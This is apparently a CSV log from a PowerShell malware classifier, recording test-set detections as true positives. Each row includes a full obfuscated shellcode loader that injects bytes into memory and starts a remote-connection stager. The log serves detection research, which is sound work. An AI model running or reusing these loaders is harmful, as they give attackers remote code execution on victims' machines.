flProtect);[DllImport(kGYkernel32.dllkGY)]','0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0','nt);hoP;xde',';xdeg = 0x1000;if (xdez.Length -gt 0x100','c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x',',0x8b,0x58,0x1c,0x01,0','u','0,0x01,0xd3','i), xdez[xdei], 1)};xdew::CreateThread(0,0,xdex,0,0,0);for (;;){Start-sleep 60};','port(kGYmsvcrt.dll','s','kGY)]public static extern IntPtr memset(IntPtr dest, uint ','nF','r, uint dwCreat','ou','8,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8',',0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a',',0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x6','xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x','5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x','lags, IntPtr lpThreadId);[DllIm','rc, uint c',',0x50','0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40','io','50,0x68,','nctions -passthru;[Byte[]];[Byte[]]xd',' In','tPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParamete','xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b','w = Add-T','Ptr VirtualAlloc(IntPtr lpAdd',',0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x08,0x68,0x02,0x0','0,0x01','33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4','ype -memberDefinition xdec -Name kGYWin32kGY -namespace Win32F','public static extern','xde','[IntPtr](xdex.ToInt32()+',',0xe3,0x3c,','0){xdeg = xdez.Length};xdex=xdew::VirtualAlloc(0,0x1000,xdeg,0x40);for (xdei=0;xdei -le (xdez.Length-1);xdei++) {xdew::memset(','e5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b','ez = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0x',',0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50',',0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3')).rEPlACe('hoP',[StRinG][CHAr]39).rEPlACe('kGY',[StRinG][CHAr]34).rEPlACe(([CHAr]120+[CHAr]100+[CHAr]101),'$') | &amp; ( $shEllID[1]+$sHElLId[13]+'x')",malicious,TP
2026-07-13 16:44:49,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1463.ps1,custom-ps-ml,UNKNOWN,e01db928-beb9-40f2-a82c-d1ca5282623b,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2767,1723.33," &amp; ( $ShElLId[1]+$sHELLId[13]+'x') ( (((\""{8}{41}{15}{4}{22}{24}{34}{26}{6}{45}{27}{21}{0}{17}{16}{31}{18}{30}{44}{3}{35}{40}{1}{11}{9}{19}{36}{20}{46}{23}{39}{38}{28}{25}{10}{43}{2}{32}{37}{29}{14}{7}{33}{5}{42}{12}{13}\"" -f 'x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0',',0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x7','6,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5','xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,','aRU)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(aRUmsvcrt.dllaR','::VirtualAlloc(0,0x1000,Y1Wg,0x40);for (Y1Wi=0;Y1Wi -le (Y1Wz.Length-1);Y1Wi++) {Y1Ww::memset([IntPtr]','1Wc -Name aRUWin32aRU -namespace Win32Functions -passthru;[Byte[]];[Byt','0){Y1Wg = Y1Wz.Length};Y1Wx=Y','Y1Wc = 0dr[DllImport(aRUkernel32.dllaRU)]public static extern IntPtr VirtualAlloc(','c,0x77,0x26,0x07,','0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,','3,0x32,0x5f,0x54,0x68,0x4','Y1Ww::CreateThread(0,0,Y1Wx,0,0,0);for (;;){Start-sleep 6','0};','ec,0xc3;Y1Wg = 0x1000;if (Y1Wz.Length -gt 0x100','Address, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(aRUkernel32.dll',',0x01,0xc7,0xe2,0xf0,0x52','xc1,0xcf,0x0d','x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0','0xff,0xd5,0xb8,0x90','b,','00,0','U)]pu',',0xd5,0x','bli','0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,','(IntPtr dest, uint src, uint count);0dr;Y1Ww = Add-Type -memberDefinition Y','0,0x','e0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x6b,0x68,0x02,0x00,0x01,0xbb,','3,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0x','x8b,0x48,0x1',',0x57,0',',0x93,0x53,0x','1Ww','c static extern IntPtr memset','0xd6,0x31,0xff,0x31,0xc0,0xac,0xc',',0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6','6a,0x00,0x56,0x5','0x68,0xea,0x0f,0xdf,0x','50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,','1,0xcf,0x0d','IntPtr lp','(Y1Wx.ToInt32()+Y1Wi), Y1Wz[Y1Wi], 1)};','0x00,0x5','8,0x8b,0x58,0x20,0x01,0xd3,0','e[]]Y1Wz = 0xfc,0xe8,0x89,0x0','0x00,0xff')) -ReplAcE'aRU',[cHar]34  -CRepLAcE  '0dr',[cHar]39  -CRepLAcE([cHar]89+[cHar]49+[cHar]87),[cHar]36))",malicious,TP
2026-07-13 16:44:54,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1468.ps1,custom-ps-ml,UNKNOWN,87b8e309-a19a-4840-ade3-3ee125978a72,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2886,1721.07," ((\""{3}{36}{26}{39}{10}{34}{0}{12}{2}{14}{23}{44}{20}{37}{5}{45}{29}{43}{11}{4}{42}{25}{21}{32}{7}{15}{40}{38}{6}{24}{31}{48}{22}{30}{13}{9}{28}{18}{35}{17}{19}{27}{41}{16}{8}{46}{33}{47}{1}\"" -f', uint dwSi','eep 60};','int flAllocationType, uint flProtect);[DllImport(68Ckernel32.dll68C)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPt','PomH9S = qB0[D','0x0c,0x14,0x87,0','ce Win32Functio','6,0x5e,0x66,0x2a,0xe7,0xfa,0xec,0xc6,0xfc,0x76,0xaf,0x8e,0x31,0xbb,0x5','57,0x34,0x69,0','omNb7=Pomw::VirtualAlloc(0,0x1000,Pomg,0x40);for (Pomi=0;Po','0','tPtr','d3,0x29,','ze, u','x5a,0x52,0x99,0x79,0x1b,0x02,0x71,0x90,0x94,0x7d,0x61,0x9b,0x7e,0x16,0x0b,0x74,0xd7,0x4e,0xa3,0xed,','r lpParameter, uint dwC','x0e,0x0e,0x96,0x8','gth};P','a9,0x1a,0x61,0xef,0xf9,0x3f,0x6e,0x3a,0x6e,0xec,0xfb','0x13,0x98,0x46,0xf4,0x9a,0x0c,',',0xc5,0xc7,0x41,0xab,0xad,0xe5','adId);[DllImport(68Cmsvcrt.dll68C)]p','d,0x65,0x46,0x73,0xd0,0x64,0x8f,0x6e,0x19,0x34,0x','x35,0x7d,0xe4,0x48,0xde,0x7c,0x1b,0x89,0','reationFlags, IntPtr ','0,','b2,0x4f,0x81,0x9b,0x41,0x3d,0x0e,0xab,0xe2,0x88,0x68,0x82,0xf3,0xa1,0x49,0x85,0x77,0xb8,0x9','.dll68C',',0xbc,0x9b,0x71,0x15,0xeb','x72,0x04,0x52,0xf1,0xa8,0x60,0x54,0x79,0x5f,0x94,0x1a,0x8a,0x2a,0x86,0xca,0x7a,0x61,0xf4,0x5c,0x84,0x5f,0x93,0x60,0x10,0x64,0x32,0x37,0x8c,0x66,0x63,0x7f,','8,0x46,0x0f,0x64,0xcf,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x45,0x13,0x83,0xed,0xfc,0x03,0x45,0x49,0xed,0x91,0x33,0','xa5,0x08,0xfd,0xd9,0x89,0','0x4e,0x5e,0xcc,0x23,0x7c,0xc1,0x66,0xac,0xcc,0x8a,0xa0,0x2b,0x33,0xa1,0x15,0xa3,0xca,0x4a,0x66,0xed,0x08,0x1e,0x36,0x85,0xb9,0x1f,0xdd,0x55,0x46,0xca,0x4','58,0xe4,0x8c,0xa9,0xed,0xb0,0x0c,0x41,0xbd,0x55,0x15,0xb6,0x75,0x','.Length-1);Pomi++) {Pomw::memset([IntPtr](PomNb7.',' lpAddress','0x29,0x62,0xe3,0xc0,0xa9,0x72,0xb5,0x8a,0x','llImport(68Ckernel32','ublic static extern IntPtr memset(IntPtr dest, uint src, uint count);qB0;Pomw = Add-Type -memberDefinition PomH9S -Name 68CWin3268C -namespa',',0xf9,0xcb,0xfd,0xc7,0xc4,0xe4,0x0f,0x19,0x00,0xc2,0xef,0x6c,0x78,0x31,0x8d,0x76,0xbf,0x48,0x49,0xf2,0x24,0xea,0x1a,0xa4,0x80,0x0b,0xce,0x33,0x42,0x07,0xbb,0x30,0x0c,0x0b,0x3a,0x94,0x26,0x37,0xb7,0x1b,0xe9,0xbe,0x83,0x3f,0x2d,0x9b,0x50,0x21,0x74,0x41,0x3',')]public static extern IntPtr VirtualAlloc(In','b,0xc3,0x3a,0x9f,0x93,0x00,0x06,0x69,0x2f,0xf2,0xfc,0x68',',0x1d,0x4d,0xc0,0xd5,0x6b,0xbf,0xd0;Pomg = 0x1000;if (Pomz.Length -gt 0x1000){Pomg = Pomz.Len','x3a,0x3e,0xa4,0xc3,0x6f,0x','xbd,0x73,0x59,0xcc,0x3d,0x14,0x','lpThre','ns -passthru;[Byte[]];[Byte[]]Pomz = 0xb','mi -le (Pomz','ToInt32()+Pomi), Pomz[Pomi], 1)};Pomw::CreateThread(0,0,PomNb7,0,0,0);for (;;){Start-sl','8,0x53,0xd0,0')).rEpLaCE('68C',[STrIng][CHAr]34).rEpLaCE('Pom',[STrIng][CHAr]36).rEpLaCE('qB0',[STrIng][CHAr]39)| .( $VerboSEPrEFeREncE.tostrIng()[1,3]+'X'-JoiN'')",malicious,TP
2026-07-13 16:44:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1472.ps1,custom-ps-ml,UNKNOWN,1e5df0e0-f0f6-4040-a7ab-a41cbbe1dd8c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3198,1888.57,"((\""{21}{26}{72}{44}{66}{24}{11}{3}{56}{22}{38}{31}{58}{65}{4}{8}{13}{33}{74}{35}{39}{43}{70}{10}{54}{25}{6}{64}{40}{53}{9}{20}{49}{68}{27}{0}{57}{1}{36}{12}{16}{42}{30}{28}{52}{69}{47}{73}{55}{29}{2}{61}{37}{48}{32}{19}{60}{51}{67}{41}{71}{15}{59}{23}{62}{46}{7}{14}{45}{63}{50}{34}{17}{5}{18}{75}\"" -f ',0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4','xff','0x4e,0x08,0x7',', IntPtr lpParameter, ui','xe5,0x31,0xc0','GQi -le (BGQz.Length-1);BGQi++) {BGQw::memset([IntPtr](BGQx.ToInt32()+BGQi), BGQz[BGQi], 1)};BGQw::CreateThrea','xff,0xac,','z.Length -gt 0x1000){BGQg = BGQz.Length',',0x64,0x8b,0x50,0x30,0x8b,0','4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b','0',';[DllImport(f86kernel32.dllf86)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress','6','x52,0x0c,0x8b,0x52,0x14,0','};BGQx=BGQw::Virtua','0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,','a,0x05,0x','0;B','d(0,0,BGQx,0,0,0);for',',0xd5,0x93,0x53,0',',0x0c','BGQc = HXv[DllImport(f86kerne','ntPtr lpThreadId);[DllImport(f86msvcrt.dllf86)]public static exter','x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0x','lpAddress, uint dwSize, uint flAllocationType, uint flProtect)',',0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0','l32.dllf','0x33,0x32','1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0',',0x0a,0xff,','0x','c -Name f','5,0xff','x8b,0x72','0x40);for (BGQi=','4a,0x26,0x31,0xff,0xac,0x',',0xd5,0x','x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57','n IntPtr memset(IntPtr dest, uint src, uint count);HXv;BGQw = Add-Type -memberDefinition BGQ','3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d','01,0xc7,0x38,0xe','0x68,0x','68,0xc0,0xa8,0x00,0x80,0x68,0x02,0x00,',',0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x5','IntPtr VirtualAlloc(','lAlloc(0,0x1000','3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;BGQg = 0x1000;if (BGQ','0,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10',',0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe',',0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x','Qg,','0x56,0x53,0x57,0x68,0x02,0x','x50,','0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe','x8b,0x59,0x20,0x01,0xd3','x74','nt dwCreationFlags, I',',0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0','86Win32f86 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]BGQz = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x','0x75,0x6e,0x4d,0x61,0xff,0xd5,0','x6a,0x00,','5,0xec,0xe8,0x61,0x00,0','c',',BG','0xc1,0xcf,0x0d,0x','60,0x89,0','IntPtr ','d9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,','24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,','0x40,0x5','1,','00,','86)]public static extern ',',0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0',',0x28,0x0f,0xb7,0x',' (;;){Start-sleep 60};')).REpLAcE('HXv',[STrInG][CHAr]39).REpLAcE(([CHAr]102+[CHAr]56+[CHAr]54),[STrInG][CHAr]34).REpLAcE('BGQ',[STrInG][CHAr]36)| . ( $sHeLLiD[1]+$SheLLId[13]+'x')",malicious,TP
2026-07-13 16:45:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1474.ps1,custom-ps-ml,UNKNOWN,30370a04-7a7d-48bc-9f22-cd87cbbe7f06,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3601,1676.35,"(((\""{63}{50}{83}{19}{42}{8}{16}{39}{22}{4}{58}{57}{44}{1}{60}{20}{72}{12}{35}{32}{33}{41}{23}{46}{34}{78}{66}{2}{18}{67}{17}{28}{51}{73}{11}{40}{49}{45}{36}{52}{47}{68}{74}{84}{81}{54}{29}{77}{69}{27}{70}{43}{61}{6}{55}{31}{24}{65}{38}{0}{14}{82}{59}{7}{56}{76}{71}{10}{53}{80}{64}{3}{62}{30}{5}{37}{15}{75}{9}{79}{85}{13}{25}{21}{48}{26}\""-f '0x86,0xff,0xd5,0x53,0x53,0x53,0x5','t, uint',',0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,',',0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x','lic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint ','69,0x7a,0x61,0x6e,0x6f,0x76,',',0xff,0xd5,0x96,0x6a,0x0',',0xd9,0xe8,0x4f,0x00,0x00,0x','Alloc(IntPtr lpA','(0','0x58,0xa4,0x53','ff,0xd5,0x53,','0,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c',' (DMQi=0;DMQ','3,0x56,0x68,0',',0xd5;DMQ','ddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(f','54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,','0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x','rnel32.dllf1O)]public static exter','Byte[]]DMQz = 0xfc,0xe8,0x82,0x00,0x00,','ngth-1);DMQi++) {DMQw::memset([IntPtr](DMQx.ToInt32()+DMQi), DMQ','Okernel32.dllf1O)]pub','0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,','6a,0','i -le (DMQz.Le','tart-sleep 60};','0x68,0x00,0x32,0x','0x31,0',',0x9f,0xc6,',',0x5f,0xe8,0x77,0xff,0xff,0xff,0x6c,0x','0,0x6a,0x04,0x50,0x','xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,','0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,',',0x66,0x8b,0x0c,0x4b,0',',0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0',',0x49,0x5a,0x54,0x78,0x68,0x4f','0x61,0x2e,0x7a,0x61,0x70,0x74,0x6f,0x2e,0x6f,0x72,0x67,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff','8,0x75,0x46,0x9e,','1','0x53,0x6a,0x','0x20,','n IntPtr Virtual','57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3','Ptr des','8,0x5b,0x11,0x00,0x00,0xe8,0xb3,0x00,0x00,0x00,0x2f,0x77,0x54,0x56,0x57,0x6e,0x6b,0x78,0x6f,0x56,0x6f','0xd3','8,0x41,0x42,0x6b,0x76,0x61,0x42,0x51,0x57,0x64,','z[DMQi], 1)};DMQw::CreateThread(0,0,DMQx,0,0,0);for (;;){S','03,0x53,0x53,0x6','[DllI','xdb,0x53,',',0x54,0x7a,0x44,0x4d,0x44,0x41,0x4c,0x70,0x79,0x5',',0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe',',0x50,0x68,0x57,0x89','a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe','00,0x6a,0x40,0','Id);[DllImport(f1Omsvcrt.dllf1O)]public static extern IntPtr memset(Int','dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThread','6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75',' src, uint count);fSk;DMQw = Add-Type -memberDefinition DMQc -Name f1OWin32f1O -namespace Win32Functions -passthru;[Byte[]];[','b','07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3','DMQc = fSk','0','x1f,0x56,0x6',',0x5b,0x61,0x59,0x5a','69,0x6e,0x69,0x','0x45,0x32,0x38,0x68,0x','89,0xc6,0x53,','e0,0x84,0x53,0x53,0x53,0x','53,0x68,','0x00,0x6','0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0x','4c','g = 0x1000;if (DMQz.Length -gt 0x1000){DMQg = DMQz.Length};DMQx=DMQw::VirtualAlloc','x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x','0xff,0xd5,0x','x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b',',0x1000,DMQg,0x40);f','7,0x57,0x68,0x00,0x20,0x0','a,0x6b,0x51,0x6c,0x79,0x37,0x00','x2d,0x0','mport(f1Oke',',0x7','or')) -rePlace ([cHAR]68+[cHAR]77+[cHAR]81),[cHAR]36  -rePlace  ([cHAR]102+[cHAR]49+[cHAR]79),[cHAR]34  -rePlace 'fSk',[cHAR]39) |. ( $ShELlId[1]+$sHELLId[13]+'X')",malicious,TP
2026-07-13 16:45:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1477.ps1,custom-ps-ml,UNKNOWN,12f9bb23-1ee2-48a4-b8af-38dafadb8ea2,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2845,1664.05," (((\""{13}{10}{25}{29}{1}{36}{20}{35}{15}{34}{5}{40}{2}{22}{43}{23}{38}{4}{41}{42}{39}{32}{24}{37}{21}{3}{18}{14}{12}{17}{44}{19}{46}{8}{28}{9}{16}{11}{26}{0}{45}{33}{6}{30}{27}{31}{7}\""-f'x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc','int dwSize, uint flAllocationType, uint flProtect);[DllImport(xJikernel32.dllxJi)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddre','passthru;[Byt',',0x24,0x24','4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,','uint count)','th','9,0,0,0);for (;;){Start-sleep 60};','5','6,0x6a,0x40,0x6',' = bsw[DllImport(xJikernel32.dllxJi)]pu','0x58,0xa4,0x53,0xe5','5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68','iTausQ9',',0x','ic s','8,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,',',0x4c,0x77,0x26,0x07,0xff,0x',',0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58','d5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x11,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,',' dwCreation','9,0x44','e[]];[Byte[]]',',0xd0,0x','b,0x58,0x1c,0x01,0xd3','blic sta',',0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0','gt 0x1000){iTag = iTaz.Length};iTaI619=iTaw::VirtualAlloc(0,0x1000,iTag,0x40);for (iTai=0;iTai -le (iTaz.Length-1);iTai++) {iTaw::memset([IntPtr](iTaI619.ToInt32()+iTai',',0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x3','tic extern IntPtr VirtualAlloc(IntPtr lpAddress, u',' -','), iTaz[iTai], 1)};iTaw::CreateThread(0,0,iTaI61','2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8','00;if (iTaz.Leng','tatic extern IntPtr memset(IntPtr dest, uint src, ','Flags, IntPtr lpThreadId);[DllImport(xJimsvcrt.dllxJi)]publ','ss, IntPtr lpParameter, uint',',0x8b,0x04,0x8b,0x01,0xd0,0x8','8b,0x40,0x78,0x85,0xc0,0x74,0x','x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe',';bsw;iTaw = Add-Type -memberDefinition iTausQ9 -Name xJiWin32xJi -namespace Win32Functions -','0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0','xf4,0','iTaz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01','d5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0x','3;iTag = 0x10','0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd')) -RePLAcE ([Char]120+[Char]74+[Char]105),[Char]34  -RePLAcE([Char]105+[Char]84+[Char]97),[Char]36  -crePLace  ([Char]98+[Char]115+[Char]119),[Char]39)| &amp;( $VeRBoSEpreFEReNce.TOstrinG()[1,3]+'x'-JOIN'')",malicious,TP
2026-07-13 16:45:41,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1484.ps1,custom-ps-ml,UNKNOWN,6bab46d7-2c1a-40b4-8758-85aa75e49772,DESKTOP-BAC9DBQ,malicious,0.9983,RandomForest,3436,1659.76,"(((\""{5}{54}{4}{14}{26}{3}{40}{11}{12}{29}{37}{7}{53}{25}{35}{39}{9}{10}{55}{51}{43}{18}{41}{56}{8}{15}{1}{32}{28}{13}{27}{34}{44}{6}{22}{49}{17}{52}{20}{16}{47}{21}{48}{23}{0}{36}{31}{19}{38}{45}{24}{50}{33}{30}{46}{2}{42}\"" -f ';','0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x','hCcmd 6h',');[DllImport(Diekernel32.dllDie)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags','el32.dllDie','6hC1 = Amv6hCc = 